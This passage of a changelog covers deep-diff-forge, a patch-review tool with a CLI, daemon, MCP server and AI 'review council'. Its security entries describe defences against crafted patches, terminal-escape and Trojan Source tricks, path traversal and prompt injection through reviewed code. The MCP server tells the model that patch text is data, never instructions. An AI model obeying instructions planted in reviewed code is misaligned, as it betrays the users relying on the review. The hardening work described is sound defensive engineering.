  returns a `Review` whose `to_json` is the CLI's review document byte for byte;
  `rank` orders it by risk; `exit` re-exports the registry; `Client` calls a
  running daemon. `Error` maps to the CLI exit codes. The public signatures are
  pinned by a compile-checked test, and a live in-process daemon test proves the
  client and the facade agree.
- **`deep-diff-forge rpc`:** the daemon's JSON-RPC over stdio, with no daemon.
  It uses the socket server's own line handler and request cap, and stops on
  `daemon.shutdown`.
- **Python client** (`sdk/python`, standard library only): `StdioClient` and
  `SocketClient`. Its tests check CLI parity over both transports and run in CI.

### Added (slice D: MCP server)

- `deep-diff-forge mcp`: a read-only, dual-era MCP server over stdio. It
  implements the 2026-07-28 specification (per-request `_meta`,
  `server/discover`, `resultType`, `UnsupportedProtocolVersion` -32022) and keeps
  the `initialize` handshake for 2025-11-25 and earlier clients. Its tools are
  `review_patch` (the daemon's `diff.compute`, the same JSON value as the CLI's
  document, tested over real stdio), `rank_patch`, `explain_exit_code` and
  `exit_code_registry`. All are annotated read-only. Domain refusals are tool
  errors (`isError`); malformed calls are protocol errors. Request lines are
  capped and stdout carries only protocol messages.

### Added (slice B: daemon parity, protocol 1)

- **Daemon `diff.compute`** returns the same `deep-diff-forge.review.v0` document
  as `--stdin-patch --json` for the same bytes, under the same input contracts
  (`require_files`, `require_hunks`). A parity test proves this across fixtures
  and guard combinations. The input-contract predicate moved to
  `deep_diff_forge_patch::InputGuards`, shared by both surfaces.
- **`engine.methods`** lists every method with its params, result and protocol
  version. `engine.initialize` reports the method names and refuses a protocol
  version it does not speak (domain error 2). Domain error 7 is an input-contract
  refusal, matching CLI exit 7.

### Added (slice A: CLI contract v1)

- `deep-diff-forge envelope -- <command…>` wraps any command's result in one
  `ddf.result.v1` JSON object: exit code, registry outcome, stdout (parsed when it
  is one JSON value), stderr, and any truncation. It runs the command as a child
  of the same binary with stdin passed through, leaves the command's own output
  unchanged, and exits with its code.
- `deep-diff-forge schema [result|exit-codes]` prints the envelope's JSON Schema
  (2020-12) or the exit-code registry. `deep-diff-forge explain <code> [--family
  engine|council] [--json]` names one code.
- One exit-code registry, by command family (`engine`, `council`), owned by
  `deep_diff_forge_core::exit` so the daemon and SDK slices can share it. Every
  exit site uses its constants, and a source-scan test forbids numeric exit
  literals. The engine meanings now say what the codes are used for: 3 is any I/O
  or encoding failure, 4 is any invalid input, and 101 is a panic (council sa1:
  the old "patch parse" label misnamed receipt and analysis errors). The README
  documents both tables, and a test fails if they drift from the registry.
- `envelope` keeps the command's exit code when its own reader closes the pipe;
  whitespace-only stdout stays text; the schema lists every emitted field as
  required and enumerates `outcome`.
- `--help` no longer says crates.io is blocked only by a missing token; it is on
  hold until the codebase is production-ready.

### Changed

- **The crates.io hold is a condition, not a missing secret.** The publish job
  runs only when the repository variable `DDF_CRATES_IO` is `open`; before, it
  ran on every tag and skipped only because no token was configured.
- **`rank_patch` is bounded like `review_patch`.** Above 256 KiB it returns a
  `deep-diff-forge.rank-summary.v0` with the highest-ranked files that fit and
  `omitted_files`.
- **Fallback reasons and semantic kinds have written-out wire names**
  (`FallbackReason::wire_name`, `SemanticChangeKind::wire_name`) instead of
  `Debug`; the bytes are unchanged.

- **CI runs on Ubuntu 26** (Luke's decision, a measured trial, 2026-10-27).
  Every CI job and the release workflow's supply-chain and publish jobs run on
  `ubuntu-26.04`. The trial measured rootless Podman 5.7.0 on Ubuntu 26.04.1
  (kernel 7.0.0): the AppArmor user-namespace restriction starts on, as on
  24.04; the existing guarded step lifts it; and all 12 planted-breach probes
  were refused. The Linux release binary is still built on `ubuntu-24.04`, so
  its glibc requirement keeps it running on older distributions.
- **GitHub and GitLab `main` share one history again** (Luke's decision,
  2026-10-27). GitLab `main` carried three commits from 2026-06-23 (review
  cockpit hardening) that GitHub never received; their code had already
  reached GitHub by another path. A merge joins the histories (the code is
  unchanged), so GitLab `main` fast-forwards with no force push. The two
  collaboration logs they added live under `docs/history/2026-06-23-review-cockpit/`.
- **One parse → guard → seal path** (anchor C-05; library API).
  `deep_diff_forge_patch::SealedReview::new` decodes, parses, applies the input
  contracts and seals the same bytes; the CLI's `--stdin-patch`, the daemon's
  `diff.compute` and the SDK's `review` all use it, and Git selections seal
  through `StructuredDiff::sealed_review` from the same capture.
  `to_json_sealed` is no longer public, so a seal can no longer be paired with
  files parsed from other bytes. Every output is byte-identical.
- **The design docs say they are target design** (anchor E-01).
  `SCHEMATICS.md`, `ARCHITECTURE.md` and `MODULE_STRUCTURE_PLAN.md` open with
  a target-design banner, and `SCHEMATICS.md` carries a generated "current
  crates and edges" block rendered from `docs/crate-edges.txt`; a test fails
  when the block is stale (`DDF_BLESS_SCHEMATICS=1` regenerates it).
- **`deploy status` says it ran nothing** (anchor E-06). Its gates are a
  static `not-run` list; the JSON now carries `"gates_run": false` so a caller
  cannot read `not-run` as a verdict, and the human output points at `just ci`.
- **Council fields that take a closed set are enums** (anchor C-02; library
  API). `Request.builder_family` (`BuilderFamily`), a challenge's
  `disposition` (`Disposition`) and `Assessment.state` (`AssessmentState`)
  were strings checked after parsing; an invalid value is now refused when it
  is read. The JSON is unchanged, and a test holds the reviewer-facing
  report schema's enum lists equal to the Rust enums.
- **The council grades only a verified manifest** (anchor C-01; library API).
  `load_manifest` returns a `SealedManifest`, which nothing else can construct,
  and `assess` takes it, so an in-memory `Manifest` that skipped the seal,
  request and artifact-digest checks can no longer be assessed. It reads as
  the `Manifest` it wraps.
- **`StructuralDiff` has one state, not three flags and an `Option`**
  (anchor C-06; library API). `state: StructuralState` is `Unavailable(reason)`,
  `Degraded`, `LineAnchored` or `Minimal { reformat_only }`, so combinations
  such as "reformat-only and unavailable" can no longer be built. The
  `reformat_only()`, `degraded()`, `minimal()` and `unavailable()` accessors
  report what the fields did, and every JSON output is byte-identical.
- **A learning receipt cannot carry a path** (anchor C-07; library API).
  `StrategyReceipt.file_hash` is a `RedactedId`, which only `redacted_id()`
  makes and which deserializing checks (16–64 lowercase hex characters), so a
  path is refused when a receipt is built or read, not only when it is stored.
  On disk the field is the same bare string. A load error now names its store
  line for malformed JSON too.
- **`InputGuards` has no `Default`** (anchor C-04; library API). "No guards"
  is written out as `InputGuards { files: false, hunks: false }`, so
  `..Default::default()` can no longer silently drop a contract a caller asked
  for; the SDK's `Guards` already worked this way. A `compile_fail` doctest
  holds it.
- **The test-count floor is retired** (anchor B-09). The 50-tests-per-crate
  rule was never enforced, and `just test-audit` always exited 0 (and read 0
  without `rg`); the project's own antipattern catalogue lists count literals
  as a false oracle. The Testing Gold Standard and the deployment docs now
  name diff-scoped mutation (0 missed in the changed code) as the coverage
  oracle, and the `test-audit` recipe is removed.
- README exit-code table gains code 7 and the recommended gate command now
  reads `--require-files --require-hunks`. The workspace has 1,192 passing tests
  (1 ignored), measured 2026-10-26 on the stage D tree; the 991 baseline is
  historical.
- The exemption control evolved through councils r10–r18: a skip-attribute
  lexer, then oracle spans (r12), differential MIR compilation (r13), the
  gate's own build (r14), proven test code (r15), five configurations (r16),
  an allow-list (r17) and `#[cfg(test)]` only (r18). Councils r18–r21 then
  hardened the evidence:
  - incremental state is removed before each build, and drift of the
    unmodified tree is inconclusive (r19–r20);
  - path dependencies are observed (r19);
  - a build script's `cfg(test)` is refused from cargo's own report (r19);
  - each unit's dep-info is held to an allow-list and fails closed (r20–r22);
  - the controller requires exactly the gate and release configurations and a
    clean outcome (r19–r20).

  A stop rule bounds further detectors (r21). Each step answered a council
  finding; `docs/REVIEW_COUNCIL.md` keeps the history.
- The skip-attribute lexer (about 580 lines) is retired (r13); the oracle is
  the single control. `code_lines` widening follows nested comments, attribute
  brackets, plain/byte/raw strings and character literals.
- The mutation job carries `CARGO_ENCODED_RUSTFLAGS=--emit=link,mir`, the same
  flag as the oracle's builds, so the two are indistinguishable by flags.
- CI runs every job on `ubuntu-24.04`, where the rootless-Podman step was
  measured; `ubuntu-latest` moves to Ubuntu 26, which will be its own measured
  change. `actions/checkout` (v4 → v7.0.1) and `softprops/action-gh-release`
  (v2 → v3.0.3) move to their Node 24 releases, pinned by SHA.
- Structural diff trims the common token prefix and suffix before the LCS and
  anchors oversize diffs on unchanged lines.
- CI: every toolchain pinned (stable 1.99.1, `nightly-2026-10-25`); the
  evidence job's mutation timeout raised to 300 s; the real-Podman sandbox
  suite runs on GitHub-hosted runners with canary (non-secret) credential
  files and prints job diagnostics on failure; pedantic clippy covers the
  no-default-features build and the fuzz crate; gitleaks 8.30.1 (checksum
  pinned) scans full history. `.gitignore` covers `__pycache__/`.

### Fixed

- **Patch parsing is linear in metadata lines.** Every non-body line rescanned
  all of the file's metadata, so 1M `index` lines (8 MB) took 139 s and held the
  daemon's engine past every client deadline; it now takes 0.20 s.
- **A refused learning receipt exits 4** (change the input), not 3 (a
  retryable I/O failure), as the README documents.
- **A second `daemon start` never replaces a live daemon's socket.** It
  exits 6 instead of orphaning the running daemon.
- **`daemon --socket PATH health` works.** Commands take their positionals
  from argument admission, so an option's value is never read as the
  subcommand. `--foreground` belongs to `daemon start` alone (which always
  serves in the foreground) and is refused elsewhere.
- **The daemon never sends a response over its 80 MiB line cap**; it answers
  `RESOURCE_EXHAUSTED` (8) for the same id instead of a line the client
  refuses. The README now says one engine serves the eight connections.
- **The daemon client reads a complete response on macOS** when the daemon
  closes first, and gates never fall back to running as root where `/proc` is
  missing (found by the first macOS test runs).
- **No trust policy trusts a strategy with no receipts**, even with
  `min_samples: 0`.
- **The Python `SocketClient` raises `TransportError`** for a missing socket, a
  refused connection or a timeout, as documented, not a bare `OSError`.
- **The README's daemon section** lists all ten methods and protocol 1, under a
  test.

- **Antipattern rows record what enforces them** (anchor B-10). A catalogue
  row may carry a DDF-owned `ddf_enforcement` claim beside its verbatim import
  labels; the policy checker accepts it only when every piece of evidence
  resolves against parsed configuration (a workspace lint at `deny`, a path
  in `clippy.toml`'s `disallowed-methods`), and its report lists the enforced
  rows. AP-17 (unreviewed lint suppression, B-03) and AP-06 (policy coupled to
  clock or host, B-04, with its scope stated) are the first two.
- **Every pull request is mutation-tested on its changed lines** (anchor
  B-01). A new four-shard `diff mutation` job runs `scripts/diff_mutation.sh`,
  which mutates the Rust lines the pull request changes since its merge base
  (`cargo mutants --in-diff`) and fails on any missed mutant or timeout. A
  change with no Rust lines under `crates/` passes and says so. Before, CI
  mutated two functions of the review crate, and "0 missed on every diff" was
  held by habit.
- **The local CI replica and pre-push hook are versioned** (anchor B-07).
  `scripts/ci_local.sh` replicates every step of the CI gate jobs and fails
  closed; each step is labelled with the CI step it replicates, and
  `tests/ci_replica.rs` fails when a CI step has no replica step or a replica
  step names no CI step. `just ci` runs it (before, `just ci` was the feature
  gate alone, without docs, deny, audit, SBOM, MSRV, soak, probes, the SDK test
  or the fuzz compile). The gitleaks pre-push hook is `scripts/hooks/pre-push`;
  `just install-hooks` installs it and `just doctor` reports whether it is
  installed.
- **CI runs weekly** (anchor B-11). A `schedule:` trigger (Monday 04:23 UTC)
  runs the full workflow, so a new RustSec advisory or a yanked dependency
  fails within a week even when nothing is merged.
- **The crate graph is a committed table** (anchor B-05).
  `docs/crate-edges.txt` lists every edge between workspace crates (normal,
  dev and target-specific kept apart), and `tests/crate_edges.rs` compares it
  with `cargo metadata`: a new dependency between workspace crates fails until
  the table is changed in a reviewed diff, and a row no `Cargo.toml` declares
  fails as stale.
- **Effects go through named doors** (anchor B-04). A new `clippy.toml`
  disallows `Command::new`, `env::var`/`var_os`, `Instant::now`,
  `SystemTime::now` and `thread::sleep`. The 21 functions that legitimately
  spawn, read the environment or read a clock each carry
  `#[expect(clippy::disallowed_methods, reason = "<door>")]` naming the door,
  and the 20 integration-test files that drive real processes opt in once at
  the top. A new effect anywhere else no longer passes clippy.
- **MCP `review_patch` returns a bounded summary for large reviews** (anchor
  A-07; Luke's decision). The full document is returned while it is at most
  256 KiB; a larger one comes back as `deep-diff-forge.review-summary.v0` (the
  same seal and totals, per-file counts for up to 1,000 files, `reason`,
  `omitted_files`). `paths` returns chosen files in full and `detail: "summary"`
  asks for the summary. A 30 MB patch now answers in 181 KB instead of one
  178 MB line.
- **Review council** (`council prepare|status|review|gate`) — six default
  reviewer slots across Claude Code and Codex, independent then challenge
  rounds, controller admission that rejects fabricated citations, and `HOLD`
  (exit 7) for missing evidence. See `docs/REVIEW_COUNCIL.md`.
- **Gate sandbox** — the eight evidence gates (format, check, clippy, pedantic,
  tests, antipatterns, fuzz, mutation) run on a sealed snapshot in a rootless
  Podman container: image by ID, `--network=none` except dependency vendoring,
  read-only root and source, all capabilities dropped, `--userns=keep-id`. A
  real-Podman planted-breach suite (12 probes) guards it.
- **Diff-scoped mutation gate** — cargo-mutants 27.1.0 `--no-config --in-diff`
  against a scope diff built from verified base and candidate blobs
  (`mutation_scope`, `mutation_base`), 300 s per mutant, 4 jobs.
- **Exemption oracle** (`policy/exemption_oracle.py`, schema v7) — run before
  the mutation job; only `#[cfg(test)]` may hide code from mutation, and that
  code must leave every workspace member's non-test MIR unchanged in the gate
  and release builds. Anything else hidden is refused with no builds.
- **Git acquisition** (P1a) — `--git-working-tree [--include-untracked]`,
  `--git-staged`, `--git-range A..B`, `--repo`, `--acquisition-json`
  (`deep-diff-forge.git-acquisition.v0`).
- **`council import-tuicr`** decision journal (P1c, DDF-R18) — appends tuicr
  dispositions to an append-only `<run>/decisions.jsonl`; dry run by default.

- **`council export-tuicr`** (DDF-R54) — files controller-admitted council
  findings into a local tuicr 1.3 session as local draft notes. Dry run by
  default; `--execute` writes through `tuicr review add` with fixed argv.
  Refuses tampered reports, forge sessions, a different repository and, unless
  `--allow-review-level` is given, findings whose cited bytes in the session's
  revision differ from the run's sealed snapshot. A create-new ledger in the
  run makes re-runs no-ops. See `docs/REVIEW_COUNCIL.md#tuicr-export`.
- **Input sealing** — every input-derived machine document (`review.v0`,
  `rank.v0`, `cluster.v0`, `semantic.v0`) now carries two additive top-level
  members directly after `schema`: `input_sha256` (lowercase hex SHA-256 over
  the exact bytes read, before any parsing or normalisation) and `tool`
  (`{"name": "deep-diff-forge", "version": …}`). An orchestrator can tie a
  verdict to exact input bytes and an exact tool build. Schema names are
  unchanged (`.v0`): the fields are purely additive. SHA-256 is implemented in
  `deep-diff-forge-core` (`sha256`, `sha256_hex`, `InputSeal`) in pure safe Rust
  with no new dependency, tested against the NIST vectors;
  `deep-diff-forge-patch` gains `to_json_sealed`.
- **`--require-files`** for `--stdin-patch` — refuse a patch that parses to 0
  files with the new **exit code 7**, an empty stdout, and
  `refused: 0 files in input (--require-files)` on stderr. Gates should always
  pass it so an empty or mis-piped input is never read as a clean review.
  Default behaviour without the flag (0 files → exit 0) is unchanged.
- **`--require-hunks`** for `--stdin-patch` — closes the gap `--require-files`
  leaves open: a header-only (`diff --git a/x b/x`) or rename-only diff parses
  to one file with 0 hunks and passed the files guard with exit 0. The new
  guard refuses a patch with 0 hunks or 0 added+removed lines across all files
  (header-only, rename-only, context-only hunks) with the same **exit code 7**,
  an empty stdout, and `refused: 0 hunks in input (--require-hunks)` on stderr.
  A gate should pass **both** flags; when both would fail, the files guard
  reports first. Default behaviour without the flag is unchanged.
- Determinism contract test: `--rank --json --require-files` is byte-identical
  across runs with an identical `input_sha256`.
- **Stdio server fuzz targets** — `stdio_mcp` and `stdio_rpc` compile the
  CLI's `mcp.rs` and `rpc.rs` into the fuzz crate and drive their stdio
  loops in process, at the real cap or a small one. They assert one JSON-RPC
  2.0 object per output line, exactly one of `result`/`error`, and at most one
  answer per input line. CI runs a 10 s instrumented smoke from
  `fuzz/seeds/`.

- **`learn` is tested end to end** (anchor A-08, from Parking). Recording a
  receipt, reading the count back, the default `status` subcommand, and the
  refusals (a path in place of the redacted id, a self-contradicting receipt,
  an unknown subcommand, `record` without `--stdin`) now run against the
  binary in an isolated `XDG_STATE_HOME`. Before, replacing `learn_cmd` with a
  no-op survived mutation.
- **A self-contradicting learning receipt is refused** (anchor C-11). A
  receipt whose outcome is `revisited` but whose `revisited` flag is false is
  refused on append and on load, so scoring cannot count the revisit in one
  rate and not the other.
- **Contradicted facts corrected** (anchor E-02). `--help` no longer lists
  shipped commands (`review`, `daemon start`, the `--git-*` family) as future
  modes; its "not yet implemented" list is checked to be refused. The
  crates.io publish loop in `release.yml` now includes `sdk`, and a test keeps
  it naming every workspace crate after its dependencies. The API doc states
  protocol 1, the release doc describes per-archive SHA-256 files and
  attestations (no signed `checksums.txt`), and the feature matrix marks the
  options that do not exist.
- **An unmeasured test no longer shows as passed** (anchor B-08). The
  real-Podman sandbox test and the two real-tuicr tests printed `UNMEASURED`
  and returned, so `cargo test` reported them `ok`. They are now `#[ignore]`d
  with the command that runs them, and an explicit `--ignored` run without
  their environment fails; CI runs the sandbox test with `--ignored`.
- **Lint suppressions carry a reason and cannot go stale** (anchor B-03). The
  nine workspace `#[allow]` sites (and two in the fuzz targets) are now
  `#[expect(.., reason = "..")]`, and clippy's `allow_attributes` and
  `allow_attributes_without_reason` are denied in the workspace and fuzz
  manifests: a bare `#[allow]` no longer builds, and an expectation whose lint
  stops firing fails as unfulfilled.
- **Code-literal scans cover every source file** (anchor B-02). The exit-code
  scan read a hard-coded list of five files and stopped at the first
  `#[cfg(test)]`, which hid the production code after a mid-file test item
  (`core/src/lib.rs` from line 128, `daemon/src/serve.rs` from 181). It now
  walks every `crates/*/src` file, skips each test item on its own, and also
  catches bare `exit(N)`, `ExitCode::from(N)` and `code: N`. A new scan refuses
  JSON-RPC error-code literals outside their named constants; the MCP server's
  six `-32600` and the SDK's daemon codes `4` and `7` now use the constants.
- **One status vocabulary** (anchor D-01). The JSON, JSONL and projection label
  tables are replaced by `FileStatus::label`, and the human summary no longer
  prints `{:?}` (it printed `binarychanged` and `typechanged` where every other
  surface prints `binary_changed` and `type_changed`).
- **Syntax analysis no longer depends on machine load** (anchor A-04). The
  flat 250 ms parse deadline made one 220 KB Rust file come out complete in 9
  and timed out in 55 of 64 parallel runs, and timed out every 1 MB file even
  on an idle machine. The deadline is now a backstop of 1 s plus 5 ms per KiB,
  about seventeen times the measured linear parse rate at every size: under a
  load average of 33–39, 64 parallel runs of 220 KB, 1 MB and 1.9 MB inputs
  gave one result each. Hostile input is still cut (a 455 KiB token soup that
  ran for 125 s now stops at about 3 s). Counting tree-sitter progress
  callbacks was measured and rejected: that input made fewer callbacks per KiB
  than ordinary code.
- **The daemon recovers fully from a contained panic** (anchor A-03). It used
  to keep answering through the poisoned engine lock while each connection loop
  read the poison as "not running", so after one panic every connection got a
  single answer and was dropped. The sessions the panic may have left
  inconsistent are now cleared (`Engine::reset_sessions`; the pid, start time
  and session-id counter are kept) and the poison is cleared, so the
  connection and later ones are served as before.
- **Every fuzz target runs in CI** (anchor B-06). `patch_parser`,
  `review_json`, `daemon_protocol` and `agent_annotation` only ever compiled;
  the instrumented smoke now runs all seven targets for 10 s each and refuses a
  `fuzz/Cargo.toml` target that the step does not run. New seeds for
  `daemon_protocol` and `agent_annotation`; Dependabot now watches `/fuzz`.
- **Unknown options are refused, not ignored** (anchor A-01). Every entry point
  admits its arguments against a closed set (`cli/src/args.rs`) and exits 2,
  naming the option, with an empty stdout. Before, a misspelt guard such as
  `--require-file` was silently skipped, so a gate passed every empty patch
  with exit 0. Commands that take no arguments (`doctor`, `--version`, the
  `*-contract` printers) and `schema` now refuse extra ones too. A test ties
  every option in `--help` to an invocation that admits it.
- **A non-UTF-8 line no longer refuses the whole review** (anchor C-12).
  Real repositories commit non-UTF-8 content (Latin-1 sources, fuzz corpora):
  2 of 33 HEE v5 commits, and DDF's own merge #11 (binary fuzz seeds), failed
  with exit 3. Now `patch::decode` keeps valid lines byte-exact and decodes an
  invalid line lossily (U+FFFD); the parser marks only that line's file
  (`PatchTwin::lossy_lines`, shown as `"lossy_lines": N` in the review JSON and
  JSONL, and in the human summary), and every seal covers the exact input
  bytes (`seal_of` takes bytes; `CapturedPatch::capture_bytes`,
  `original_bytes`, `is_exact`). Output for UTF-8 input is byte-identical. A
  non-UTF-8 *path* is still refused, because a path is an identity.
  `GitAcquireError::NonUtf8Patch` is removed.
- **The review JSON records which side lacks a final newline** (anchor A-06).
  A line carries `"no_newline": true` when the marker follows it; its `kind`
  names the side (removed: old, added: new, context: both). Before, patches
  that differed only in which side lacked the newline produced identical JSON,
  although git applies one and refuses the other. Other output is unchanged.
- **The learning store validates records on load** (anchor A-05). A hand-edited
  line holding a path (or a path-like token) is refused, naming its line; before,
  only `append_receipt` applied the privacy checks.
- Non-Unix `path_from_bytes` (`deep-diff-forge-patch`) reuses valid UTF-8
  without a copy, which clears `clippy::needless_pass_by_value` in a
  Windows-target pedantic build.
- **main's red CI** (failing since 2026-06, run 37532439196): a floating
  `stable` toolchain deprecated `fetch_update` under `-D warnings`; `cargo deny`
  was called without being installed; the SBOM `documentNamespace` embedded
  wall-clock time. The namespace is now content-addressed and `created` comes
  from `SOURCE_DATE_EPOCH` or the last `Cargo.lock` commit, so regenerations are
  byte-identical. main CI is green at run 40274253094.
- **Sandbox worked only for uid 1000**: gate containers ran as the image's
  `USER 1000`, so an operator with another uid (1001 on GitHub runners) could
  not read the private source copy. Containers now run as
  `--user=<uid>:<gid>` read from `/proc/self`.
- **Probe verdict race**: parallel probe tests could write a verdict mid-line
  after libtest's `test name ... `, losing it (main run 40268250417). Verdicts
  now start with a newline and are parsed anywhere in a line.
- **`mutation_scope` emitted touching hunks** (latent since r10): a widened
  pure insertion could start on the line the previous hunk ended on, and
  cargo-mutants rejected the diff. Regions now merge on touching; property
  tests assert header ordering. Surfaced by council r17.
- The oracle removes its build trees on exit (they filled `/tmp`).
- `council_report` fuzz target builds again after the `mutation_diff_sha256`
  field.

### Security

- **No text change can hide behind a binary patch body.** After
  `GIT binary patch`, every later line was taken as binary data, so a crafted
  patch was reviewed as one binary file while `git apply` also changed a text
  file. The body now takes only the lines of git's binary grammar; such a patch
  is refused (exit 4).
- **Ids become paths only as checked segments** (anchor C-09). Every reviewer,
  job, session and fuzz-target id joined into a council run directory now goes
  through one check (`segment`, `job_dir`, `report_path`) at the join, so a
  path cannot leave the run directory even where the id was not validated
  first; before, the joins relied on `identifier()` having been called
  earlier.
- **MCP marks patch text as untrusted for the consuming model** (anchor E-07).
  The server instructions and the `review_patch` / `rank_patch` descriptions
  say that paths and line text come from the patch, whose authors wrote them,
  and are data to review, never instructions. Reviewed code and comments are
  an injection channel into a model's context; nothing said so before.
- **One hardened Git door** (anchor A-02). Git acquisition (`patch`) and
  council storage (`review`) now apply the same set from
  `deep_diff_forge_core::git`: no optional locks, replacement refs, fsmonitor,
  hooks, external diff or transports (`protocol.allow=never`,
  `GIT_NO_LAZY_FETCH`), and every inherited variable that would point Git at
  another repository removed. Measured before: `--git-range` in a partial clone
  ran `git fetch origin` against the promisor remote (a network effect from a
  read-only command); council storage honoured an inherited `GIT_DIR`, so
  `rev-parse HEAD` named another repository while the top-level check passed.
  A partial clone's missing blob is now an error, not a fetch.
- Council gates never fall back to the host: a missing gate image or a failed
  dependency-vendoring job is a refusal. Vendored dependencies are sealed and
  re-measured before each gate; base Git objects are verified on read.
- The mutation gate ignores the candidate's cargo-mutants config, and code
  hidden from mutation by anything other than `#[cfg(test)]` is refused.

## [0.2.1] - 2026-09-04

### Security

- Hardened the Unix daemon against symlink/inode-swap attacks, slowloris and
  stalled-reader clients, unbounded worker creation, oversized responses, and
  multi-session memory exhaustion. JSON-RPC fields are now shape-validated.
- Added a structural patch line budget and strict size/line/count, ownership,
  permission, and pseudonymous-identifier validation to the learning store.
- Upgraded Ratatui/Crossterm so the dependency graph uses patched `lru` 0.18.4
  and removed all RustSec advisory waivers.
- Restricted release publication to version-matching tags, stopped persisting
  checkout credentials, pinned the audit tool, and made the publish version
  derive from the workspace manifest. The separate fuzz dependency graph now
  passes the same advisory, license, source, and wildcard-dependency policy;
  CI/release concurrency and dependency-update cooldowns are explicit.

[0.2.1]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.1

## [0.2.0] - 2026-06-23

The **L9 (Learning)** layer plus the first crates.io-publishable cut, a
supply-chain & fuzz hardening pass, and the interactive **review cockpit** (ranked
tree, multi-file diff, inline agent notes, command palette, colour themes, mouse)
— 12 crates, 927 tests, zero `unsafe`, supply-chain-gated. `cargo publish
--dry-run` is clean across the workspace; the crates.io upload itself remains
token-gated.

### Added

- **Interactive review cockpit** — `review [--probe] [--side] [--palette | --cmd
  NAME]` (+ `deep-diff-forge-tui`, ratatui): a review-first terminal UI with a
  risk-ranked file tree, a multi-file diff pane, and the engine's own findings as
  inline grounded agent notes. Runtime view toggles for layout (inline ↔
  side-by-side), fold, line-wrap, and notes; a per-file **reviewed flag** (`v` /
  `Space`, auto-advancing, with a `viewed:n/total` progress indicator) for triage;
  three colour themes (`T`: dark · midnight · mono); a top menu bar and a `?`
  keybinding help card; and full **mouse** support (scroll, click-to-focus,
  sidebar selection, menu clicks). State is pure and headless-testable
  (`render_to_lines`); `--probe` renders one frame with no TTY for CI/agents.
- **Command palette** — `:` in-app, or headless via `review --palette` / `--cmd
  NAME`, runs any engine capability against the loaded review and shows it in a
  result panel: `rank`, `outline` (tree-sitter symbols of the changed regions),
  `cluster`, `summary`, `notes`, `review` (the `review.v0` JSON), live `daemon`
  health/status, `learning` scores, and the `maturity` ladder. In-process and
  read-only; never mutates patch truth.
- **`deploy release`** — `deploy release [--json]` (schema
  `deep-diff-forge.release.v0`): a declared per-target publication snapshot
  (GitHub, GitLab, GitHub release, crates.io) with a `pending` list; `crates.io`
  reports `blocked` until a registry token is configured.
- **Syntax highlighting** — `highlight <path> [--color|--no-color]` (+
  `syntax::highlight`): tree-sitter highlighting reusing the grammar's own
  `highlights.scm`, mapped to an ANSI palette. Colour auto-detects a TTY.
  Terminal-injection-safe: source text is routed through `display_safe`, so the
  only raw escapes are fixed SGR codes.
- **Structural diff** — `structural <old> <new> [--json]` (+
  `syntax::structural`, schema `deep-diff-forge.structural.v0`): a token/leaf-level
  (AST) diff over tree-sitter token streams. **Reformat-aware** (layout-only edits
  report zero structural change) with best-effort moved-block detection; never
  touches patch truth. Bounded LCS with graceful degradation on huge inputs.
- **Learning (L9)** — `deep-diff-forge-learning`: the local-only learning loop.
  Per-decision [`StrategyReceipt`]s (hashes/counts/timings — never a path or
  source line) are appended as JSONL under `$XDG_STATE_HOME/deep-diff-forge/
  learning/`, scored per strategy, and gated for promotion. Three learning units
  — planner (strategy + budget), ranking (risk weights), annotation (agent trust
  tiers, *untrusted until grounded*) — plus an explainable promotion gate. CLI
  `learn {status|record --stdin} [--json]`. 135 tests; never uploads, never
  mutates patch truth.

### Changed

- **Daemon socket handling** (Zen review) — replaced scattered `Option<PathBuf>`
  resolution with a parse-don't-validate `SocketLocation` type: one
  `SocketLocation::resolve(explicit)` entry point (explicit `--socket` → else
  `$XDG_RUNTIME_DIR` → else a typed `NoRuntimeDir`, no `/tmp` fallback), with
  `bind`/`connect`/`path` as methods. A "no location" state is unrepresentable
  past construction, and the CLI's nested `if let` collapses to one call.
- **Publishable-workspace manifests** — versions and internal deps are now
  inherited via `[workspace.package]` + `[workspace.dependencies]`; every crate
  carries `description`, `keywords`, `categories`, and `homepage`. `core` and
  `cli` gained the `description` that `cargo publish` requires.

### Fixed

- **Patch truth: malformed/truncated hunks are now rejected** (Zen review) — the
  parser enforces each hunk's declared `@@ -a,b +c,d @@` counts exactly. A hunk
  that ends (at a new header, a new file, or EOF) before its counts are satisfied
  is a `TruncatedHunk` error; a body line that over-fills a side is a
  `HunkLineCountMismatch`. An internally-incoherent patch no longer parses as
  apply-able truth.
- **Broken-pipe handling** — bulk CLI output (`--stdin-patch`, `--rank`,
  `--cluster`, `--jsonl`, `semantic`, `review --probe`, `learn`) is routed
  through a broken-pipe-tolerant writer, so `deep-diff-forge … | head` exits `0`
  instead of panicking with `EPIPE` (exit 101). Resolves the L1-era open finding;
  std-only, no `unsafe`.

### Security

Pre-publication adversarial hardening (S1008412): an 8-dimension STRIDE review
with independent verification produced a CVSS-scored register of 17 confirmed
findings (4 MEDIUM, 12 LOW, 1 INFO; **no Critical/High**), all remediated with
fail-before/pass-after regression tests. A later final-hardening review fleet
(5 reviewers + adversarial verify) added the items below. See `SECURITY.md`.

- **Trojan Source defence (CVE-2021-42574)** — `display_safe` now also escapes
  bidirectional/invisible Unicode (`U+202A–202E`, `U+2066–2069`, directional
  marks, zero-width, BOM) to a visible `\u{XXXX}`, so attacker source cannot
  display differently than it reads — on-mission for a review tool.
- **Cross-platform contract made honest** — the UDS daemon is Unix-only; it now
  emits a clear `compile_error!` on non-Unix instead of a cryptic `std::os::unix`
  failure, and the release matrix dropped its (un-buildable) Windows lane so CI
  and code agree before the irreversible publish (Linux + macOS).
- **Broken-pipe fix completed** — the remaining `deploy`/`doctor`/`--help`/
  contract commands (notably the `--json` outputs CI/agents pipe to `head`/`jq`)
  now route through the broken-pipe-tolerant writer; `… | head` exits `0`, not 101.
- **`structural` on a non-Rust file** now errors explicitly instead of silently
  reporting "formatting only"; **`doctor`** resolves both its runtime-dir and
  socket lines through the daemon's `var_os` resolver (consistent on non-UTF-8 env).
- **Terminal/ANSI-escape injection** — attacker-controlled diff bodies, file
  paths, and symbol names are now sanitized by `core::display_safe` (control
  chars escaped to a visible `\xHH`) at every human-render boundary; `json_escape`
  also neutralises `DEL` + the C1 block. A reviewer rendering a hostile patch can
  no longer have their terminal hijacked (screen clobber, scrollback forgery,
  OSC-52 clipboard write, title/hyperlink spoof).
- **Memory-exhaustion DoS** — stdin, source-file, and daemon request reads are
  hard-capped at the byte budget instead of buffering unbounded input.
- **Daemon robustness** — per-connection panic/error isolation (`catch_unwind`,
  no fatal `?`), a read timeout (slowloris), a size-bounded request line, symlink
  rejection, and **no world-writable `/tmp` socket fallback** (fails closed
